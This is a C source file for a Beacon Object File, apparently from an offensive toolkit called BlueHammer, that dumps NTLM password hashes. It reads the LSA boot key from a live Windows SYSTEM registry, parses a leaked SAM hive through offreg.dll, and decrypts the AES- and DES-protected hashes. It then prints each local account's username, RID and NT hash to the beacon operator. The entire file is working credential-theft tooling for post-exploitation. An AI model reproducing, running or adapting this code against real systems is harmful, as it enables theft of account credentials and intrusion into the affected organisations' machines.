/*
 * bh_hashdump.c - BlueHammer SAM Hash Extraction BOF
 *
 * Extracts NTLM hashes from a leaked SAM hive file.
 * Reads the LSA boot key from the live SYSTEM registry and uses
 * the offline registry library (offreg.dll) to parse the SAM hive.
 *
 * Usage: bh_hashdump /sam:C:\path\to\SAM.bin
 *
 * Requirements:
 *   - Leaked SAM file (from bh_leak or similar)
 *   - offreg.dll must be uploaded to the target (Microsoft Offline Registry Library)
 *   - If offreg.dll is not on PATH, use /offreg:C:\path\to\offreg.dll
 *   - SYSTEM registry access for boot key extraction (typically requires SYSTEM/admin)
 */

#include <windows.h>
#include <wincrypt.h>
#include "../beacon.h"
#include "include/bh_dfr.h"

/* ============================================================================
 * Offline Registry function types (resolved at runtime from offreg.dll)
 * ============================================================================ */

typedef PVOID ORHKEY;
typedef DWORD (WINAPI *fn_OROpenHive)(LPCWSTR, ORHKEY*);
typedef DWORD (WINAPI *fn_OROpenKey)(ORHKEY, LPCWSTR, ORHKEY*);
typedef DWORD (WINAPI *fn_ORGetValue)(ORHKEY, LPCWSTR, LPCWSTR, LPDWORD, LPBYTE, LPDWORD);
typedef DWORD (WINAPI *fn_ORQueryInfoKey)(ORHKEY, LPWSTR, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD);
typedef DWORD (WINAPI *fn_OREnumKey)(ORHKEY, DWORD, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
typedef DWORD (WINAPI *fn_ORCloseKey)(ORHKEY);
typedef DWORD (WINAPI *fn_ORCloseHive)(ORHKEY);

/* SAM database offsets */
#define SAM_DATABASE_DATA_ACCESS_OFFSET     0xcc
#define SAM_DATABASE_USERNAME_OFFSET        0x0c
#define SAM_DATABASE_USERNAME_LENGTH_OFFSET  0x10
#define SAM_DATABASE_LM_HASH_OFFSET         0x9c
#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET  0xa0
#define SAM_DATABASE_NT_HASH_OFFSET         0xa8
#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET  0xac

#ifndef SHA256_DIGEST_LENGTH
#define SHA256_DIGEST_LENGTH 32
#endif

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))

struct PwdEnc {
    char* buff;
    size_t sz;
    wchar_t* username;
    ULONG usernamesz;
    char* LMHash;
    ULONG LMHashLength;
    char* NTHash;
    ULONG NTHashLength;
    ULONG rid;
};

/* ============================================================================
 * Boot Key Extraction (from live SYSTEM registry)
 * ============================================================================ */

static void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len)
{
    size_t len = strlen(hex_string);
    size_t byte_len = len / 2;
    size_t i;
    if (len % 2 != 0 || byte_len > max_len) return;
    for (i = 0; i < byte_len; i++) {
        unsigned int byte_val;
        sscanf(&hex_string[i * 2], "%2x", &byte_val);
        byte_array[i] = (unsigned char)byte_val;
    }
}

static BOOL GetLSASecretKey(unsigned char bootkeybytes[16])
{
    const wchar_t* keynames[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
    HKEY hlsa = NULL;
    char data[0x1000];
    DWORD index = 0;
    unsigned char keybytes[16];
    int k, i;

    ZeroMemory(data, sizeof(data));

    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hlsa) != ERROR_SUCCESS)
        return FALSE;

    for (k = 0; k < 4; k++) {
        DWORD retsz = sizeof(data) / sizeof(char) - index;
        HKEY hbootkey = NULL;
        ADVAPI32$RegOpenKeyExW(hlsa, keynames[k], 0, KEY_QUERY_VALUE, &hbootkey);
        ADVAPI32$RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        index += retsz;
        ADVAPI32$RegCloseKey(hbootkey);
    }
    ADVAPI32$RegCloseKey(hlsa);

    if (strlen(data) < 16) return FALSE;

    ZeroMemory(keybytes, sizeof(keybytes));
    hex_string_to_bytes(data, keybytes, 16);

    for (i = 0; i < 16; i++)
        bootkeybytes[i] = keybytes[indices[i]];

    return TRUE;
}

/* ============================================================================
 * Crypto Functions
 * ============================================================================ */

static void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen, int* decryptedlen)
{
    char* decrypted = (char*)malloc(enclen);
    HCRYPTPROV hprov = NULL;
    HCRYPTKEY hcryptkey = NULL;
    DWORD mode, retsz;

    struct { BLOBHEADER hdr; DWORD keySize; BYTE bytes[16]; } blob;

    memmove(decrypted, hashdata, enclen);
    ADVAPI32$CryptAcquireContextW(&hprov, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_128;
    blob.keySize = 16;
    memmove(blob.bytes, lsaKey, 16);

    ADVAPI32$CryptImportKey(hprov, (const BYTE*)&blob, sizeof(blob), 0, 0, &hcryptkey);
    mode = CRYPT_MODE_CBC;
    ADVAPI32$CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, 0);
    ADVAPI32$CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, 0);

    retsz = enclen;
    ADVAPI32$CryptDecrypt(hcryptkey, 0, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);

    ADVAPI32$CryptDestroyKey(hcryptkey);
    ADVAPI32$CryptReleaseContext(hprov, 0);
    if (decryptedlen) *decryptedlen = retsz;
    return decrypted;
}

static BOOL ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
{
    HCRYPTPROV hprov = NULL;
    HCRYPTHASH Hhash = NULL;
    DWORD md_len = 0, inputsz;

    ADVAPI32$CryptAcquireContextW(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    ADVAPI32$CryptCreateHash(hprov, CALG_SHA_256, 0, 0, &Hhash);
    ADVAPI32$CryptHashData(Hhash, (const BYTE*)data, size, 0);
    inputsz = sizeof(md_len);
    ADVAPI32$CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, 0);
    ADVAPI32$CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, 0);
    ADVAPI32$CryptDestroyHash(Hhash);
    ADVAPI32$CryptReleaseContext(hprov, 0);
    return TRUE;
}

static void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
{
    int hashlen = data[0];
    int enclen = data[4];
    char iv[16];
    char* cyphertext;
    char* pek;
    char* hashdata;
    char* hash;
    int outsz = 0, pekoutsz = 0;
    char hash256[SHA256_DIGEST_LENGTH];

    memmove(iv, &data[8], sizeof(iv));
    cyphertext = (char*)malloc(enclen);
    memmove(cyphertext, &data[0x18], enclen);

    pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
    free(cyphertext);

    hashdata = (char*)malloc(hashlen);
    memmove(hashdata, &data[0x18 + enclen], hashlen);
    hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);
    free(hashdata);

    ComputeSHA256(pek, pekoutsz, hash256);
    if (memcmp(hash256, hash, sizeof(hash256)) != 0) {
        free(hash); free(pek); return NULL;
    }
    free(hash);
    if (keysz) *keysz = sizeof(hash256);
    return pek;
}

static void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* keysz)
{
    int enctype = samKey[0x68];
    if (enctype == 2) {
        int endofs = samKey[0x6c] + 0x68;
        int len = endofs - 0x70;
        char* data = (char*)malloc(len);
        void* retval;
        memmove(data, &samKey[0x70], len);
        retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);
        free(data);
        return retval;
    }
    return NULL;
}

static void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int* outsz)
{
    int length = data[4];
    char iv[16];
    int ciphertextsz;
    char* ciphertext;

    if (!length) return NULL;
    memmove(iv, &data[8], sizeof(iv));
    ciphertextsz = datasz - 24;
    ciphertext = (char*)malloc(ciphertextsz);
    memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
    {
        void* result = UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
        free(ciphertext);
        return result;
    }
}

static void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
{
    int enctype = data[2];
    if (enctype == 2)
        return UnprotectPasswordHashAES(key, keysz, data, datasz, outsz);
    return NULL;
}

static void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
{
    char* ciphertext2 = (char*)malloc(ciphertextsz);
    HCRYPTPROV hprov = NULL;
    HCRYPTKEY hcryptkey = NULL;
    DWORD mode, retsz;
    struct { BLOBHEADER hdr; DWORD keySize; BYTE bytes[8]; } blob;

    memmove(ciphertext2, ciphertext, ciphertextsz);
    ADVAPI32$CryptAcquireContextW(&hprov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_DES;
    blob.keySize = 8;
    memmove(blob.bytes, key, 8);

    ADVAPI32$CryptImportKey(hprov, (const BYTE*)&blob, sizeof(blob), 0, 0, &hcryptkey);
    mode = CRYPT_MODE_ECB;
    ADVAPI32$CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, 0);
    retsz = ciphertextsz;
    ADVAPI32$CryptDecrypt(hcryptkey, 0, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)ciphertext2, &retsz);

    if (outsz) *outsz = 8;
    ADVAPI32$CryptDestroyKey(hcryptkey);
    ADVAPI32$CryptReleaseContext(hprov, 0);
    return ciphertext2;
}

static char* DeriveDESKey(char data[7])
{
    union { char arr[8]; SIZE_T derv; } ttv;
    SIZE_T k;
    char* key;
    int i;

    ZeroMemory(ttv.arr, sizeof(ttv.arr));
    memmove(ttv.arr, data, 7);
    k = ttv.derv;
    key = (char*)malloc(8);

    for (i = 0; i < 8; i++) {
        int j = 7 - i;
        int curr = (int)((k >> (7 * j)) & 0x7F);
        int b = curr;
        b ^= b >> 4; b ^= b >> 2; b ^= b >> 1;
        key[i] = (char)((curr << 1) ^ (b & 1) ^ 1);
    }
    return key;
}

static void* UnprotectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULONG rid)
{
    union { struct { char a, b, c, d; }; ULONG data; } keycontent;
    char key1[7], key2[7];
    char *rkey1, *rkey2, *p1, *p2;
    int p1sz = 0, p2sz = 0;
    void* retval;

    keycontent.data = rid;
    key1[0] = keycontent.c; key1[1] = keycontent.b; key1[2] = keycontent.a;
    key1[3] = keycontent.d; key1[4] = keycontent.c; key1[5] = keycontent.b; key1[6] = keycontent.a;
    key2[0] = keycontent.b; key2[1] = keycontent.a; key2[2] = keycontent.d;
    key2[3] = keycontent.c; key2[4] = keycontent.b; key2[5] = keycontent.a; key2[6] = keycontent.d;

    rkey1 = DeriveDESKey(key1);
    rkey2 = DeriveDESKey(key2);

    p1 = (char*)UnprotectDES(rkey1, 7, ciphertext, ciphersz, &p1sz);
    free(rkey1);
    if (!p1) { free(rkey2); return NULL; }

    p2 = (char*)UnprotectDES(rkey2, 7, &ciphertext[8], ciphersz, &p2sz);
    free(rkey2);
    if (!p2) { free(p1); return NULL; }

    retval = malloc(p1sz + p2sz);
    memmove(retval, p1, p1sz);
    memmove(RtlOffsetToPointer(retval, p1sz), p2, p2sz);
    free(p1); free(p2);
    if (outsz) *outsz = p1sz + p2sz;
    return retval;
}

static void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, int* outsz, ULONG rid)
{
    int decoutsz = 0, hashoutsz = 0;
    void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &decoutsz);
    void* hash;
    if (!dec) return NULL;
    hash = UnprotectPasswordHashDES((char*)dec, decoutsz, &hashoutsz, rid);
    free(dec);
    if (outsz) *outsz = hashoutsz;
    return hash;
}

static unsigned char* HexToHexString(unsigned char* data, int size)
{
    unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
    int i;
    ZeroMemory(retval, size * 2 + 1);
    for (i = 0; i < size; i++)
        sprintf((char*)&retval[i * 2], "%02x", data[i]);
    return retval;
}

/* ============================================================================
 * BOF Entry Point
 * ============================================================================ */

void go(char* args, int alen)
{
    formatp output;
    ARG_PARSER parser;
    char* samPath = NULL;
    char* offregPath = NULL;
    HMODULE hOffreg = NULL;
    fn_OROpenHive pOROpenHive;
    fn_OROpenKey pOROpenKey;
    fn_ORGetValue pORGetValue;
    fn_ORQueryInfoKey pORQueryInfoKey;
    fn_OREnumKey pOREnumKey;
    fn_ORCloseKey pORCloseKey;
    fn_ORCloseHive pORCloseHive;
    ORHKEY hSAMhive = NULL;
    ORHKEY hkey = NULL;
    unsigned char lsakey[16];
    char* samkey = NULL;
    char* passwordEncryptionKey = NULL;
    int passwordEncryptionKeysz = 0;
    struct PwdEnc** pwdenclist = NULL;
    int numofentries = 0;
    DWORD subkeys = 0;
    DWORD err;
    int i;
    wchar_t wSamPath[MAX_PATH];

    BeaconFormatAlloc(&output, 8192);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "[*] BlueHammer SAM Hash Extraction BOF\n");
    BeaconFormatPrintf(&output, "============================================================\n");

    samPath = arg_get(&parser, "sam");
    if (!samPath) {
        BeaconFormatPrintf(&output, "[-] Missing /sam: parameter\n");
        BeaconFormatPrintf(&output, "Usage: bh_hashdump /sam:C:\\path\\to\\SAM.bin [/offreg:C:\\path\\to\\offreg.dll]\n");
        goto hd_cleanup;
    }

    /* Load offreg.dll */
    offregPath = arg_get(&parser, "offreg");
    if (offregPath) {
        wchar_t wPath[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, offregPath, -1, wPath, MAX_PATH);
        hOffreg = LoadLibraryW(wPath);
    }
    if (!hOffreg) hOffreg = LoadLibraryA("offreg.dll");
    if (!hOffreg) {
        BeaconFormatPrintf(&output, "[-] Failed to load offreg.dll. Upload it to target or use /offreg:path\n");
        goto hd_cleanup;
    }

    pOROpenHive = (fn_OROpenHive)GetProcAddress(hOffreg, "OROpenHive");
    pOROpenKey = (fn_OROpenKey)GetProcAddress(hOffreg, "OROpenKey");
    pORGetValue = (fn_ORGetValue)GetProcAddress(hOffreg, "ORGetValue");
    pORQueryInfoKey = (fn_ORQueryInfoKey)GetProcAddress(hOffreg, "ORQueryInfoKey");
    pOREnumKey = (fn_OREnumKey)GetProcAddress(hOffreg, "OREnumKey");
    pORCloseKey = (fn_ORCloseKey)GetProcAddress(hOffreg, "ORCloseKey");
    pORCloseHive = (fn_ORCloseHive)GetProcAddress(hOffreg, "ORCloseHive");

    if (!pOROpenHive || !pOROpenKey || !pORGetValue || !pORQueryInfoKey ||
        !pOREnumKey || !pORCloseKey || !pORCloseHive) {
        BeaconFormatPrintf(&output, "[-] Failed to resolve offreg functions\n");
        goto hd_cleanup;
    }

    /* Extract boot key from live SYSTEM registry */
    BeaconFormatPrintf(&output, "[*] Extracting LSA boot key from SYSTEM registry...\n");
    ZeroMemory(lsakey, sizeof(lsakey));
    if (!GetLSASecretKey(lsakey)) {
        BeaconFormatPrintf(&output, "[-] Failed to extract boot key (need SYSTEM/admin access)\n");
        goto hd_cleanup;
    }
    BeaconFormatPrintf(&output, "[+] Boot key extracted\n");

    /* Open SAM hive */
    MultiByteToWideChar(CP_ACP, 0, samPath, -1, wSamPath, MAX_PATH);
    err = pOROpenHive(wSamPath, &hSAMhive);
    if (err) {
        BeaconFormatPrintf(&output, "[-] OROpenHive failed: %d\n", err);
        goto hd_cleanup;
    }

    /* Read SAM Account key (contains encryption info) */
    err = pOROpenKey(hSAMhive, L"SAM\\Domains\\Account", &hkey);
    if (err) {
        BeaconFormatPrintf(&output, "[-] OROpenKey(Account) failed: %d\n", err);
        goto hd_cleanup;
    }

    {
        DWORD valuesz = 0;
        err = pORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
        if (err && err != ERROR_MORE_DATA) {
            BeaconFormatPrintf(&output, "[-] ORGetValue(F) size failed: %d\n", err);
            goto hd_cleanup;
        }
        samkey = (char*)malloc(valuesz);
        err = pORGetValue(hkey, NULL, L"F", NULL, (LPBYTE)samkey, &valuesz);
        if (err) {
            BeaconFormatPrintf(&output, "[-] ORGetValue(F) failed: %d\n", err);
            goto hd_cleanup;
        }
    }
    pORCloseKey(hkey); hkey = NULL;

    /* Decrypt password encryption key */
    passwordEncryptionKey = (char*)UnprotectPasswordEncryptionKey(samkey, lsakey, &passwordEncryptionKeysz);
    if (!passwordEncryptionKey) {
        BeaconFormatPrintf(&output, "[-] Failed to decrypt password encryption key\n");
        goto hd_cleanup;
    }

    /* Enumerate user accounts */
    err = pOROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
    if (err) {
        BeaconFormatPrintf(&output, "[-] OROpenKey(Users) failed: %d\n", err);
        goto hd_cleanup;
    }

    err = pORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (err) {
        BeaconFormatPrintf(&output, "[-] ORQueryInfoKey failed: %d\n", err);
        goto hd_cleanup;
    }

    pwdenclist = (struct PwdEnc**)malloc(sizeof(struct PwdEnc*) * subkeys);
    ZeroMemory(pwdenclist, sizeof(struct PwdEnc*) * subkeys);

    for (i = 0; i < (int)subkeys; i++) {
        DWORD keynamesz = 0x100;
        wchar_t keyname[0x100];
        ORHKEY hkey2 = NULL;
        DWORD valuesz = 0;
        struct PwdEnc* SAMpwd;

        ZeroMemory(keyname, sizeof(keyname));
        err = pOREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL);
        if (err) continue;
        if (_wcsicmp(keyname, L"users") == 0) continue;

        err = pOROpenKey(hkey, keyname, &hkey2);
        if (err) continue;

        err = pORGetValue(hkey2, NULL, L"V", NULL, NULL, &valuesz);
        if (err == ERROR_FILE_NOT_FOUND) { pORCloseKey(hkey2); continue; }
        if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) { pORCloseKey(hkey2); continue; }

        SAMpwd = (struct PwdEnc*)malloc(sizeof(struct PwdEnc));
        ZeroMemory(SAMpwd, sizeof(struct PwdEnc));
        SAMpwd->sz = valuesz;
        SAMpwd->buff = (char*)malloc(valuesz);
        ZeroMemory(SAMpwd->buff, valuesz);
        pORGetValue(hkey2, NULL, L"V", NULL, (LPBYTE)SAMpwd->buff, &valuesz);
        pORCloseKey(hkey2);

        SAMpwd->rid = wcstoul(keyname, NULL, 16);

        {
            ULONG* accnameoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_OFFSET];
            SAMpwd->username = (wchar_t*)RtlOffsetToPointer(SAMpwd->buff, *accnameoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
            ULONG* usernamesz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_LENGTH_OFFSET];
            SAMpwd->usernamesz = *usernamesz;

            ULONG* NTHashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_OFFSET];
            SAMpwd->NTHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *NTHashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
            ULONG* NThashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
            SAMpwd->NTHashLength = *NThashsz;
        }

        pwdenclist[numofentries++] = SAMpwd;
    }

    /* Decrypt and display hashes */
    BeaconFormatPrintf(&output, "\n============================================================\n");
    BeaconFormatPrintf(&output, "  NTLM Hash Dump (%d accounts)\n", numofentries);
    BeaconFormatPrintf(&output, "============================================================\n\n");

    for (i = 0; i < numofentries; i++) {
        struct PwdEnc* entry = pwdenclist[i];
        int hashsz = 0;
        char* hash = (char*)UnprotectNTHash(passwordEncryptionKey, passwordEncryptionKeysz,
            entry->NTHash, entry->NTHashLength, &hashsz, entry->rid);

        wchar_t username[256];
        ZeroMemory(username, sizeof(username));
        if (entry->usernamesz <= sizeof(username) - sizeof(wchar_t))
            memmove(username, entry->username, entry->usernamesz);

        if (hash && hashsz > 0) {
            unsigned char* hexhash = HexToHexString((unsigned char*)hash, hashsz);
            BeaconFormatPrintf(&output, "  %ls:%d:%s\n", username, entry->rid, hexhash);
            free(hexhash);
            free(hash);
        } else {
            BeaconFormatPrintf(&output, "  %ls:%d:{NULL}\n", username, entry->rid);
        }
    }

    BeaconFormatPrintf(&output, "\n============================================================\n");
    BeaconFormatPrintf(&output, "[+] Hash extraction complete\n");

hd_cleanup:
    if (hkey) pORCloseKey(hkey);
    if (hSAMhive) pORCloseHive(hSAMhive);
    if (hOffreg) FreeLibrary(hOffreg);

    if (pwdenclist) {
        for (i = 0; i < numofentries; i++) {
            if (pwdenclist[i]) {
                free(pwdenclist[i]->buff);
                free(pwdenclist[i]);
            }
        }
        free(pwdenclist);
    }
    if (samkey) free(samkey);
    if (passwordEncryptionKey) free(passwordEncryptionKey);
    if (samPath) free(samPath);
    if (offregPath) free(offregPath);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
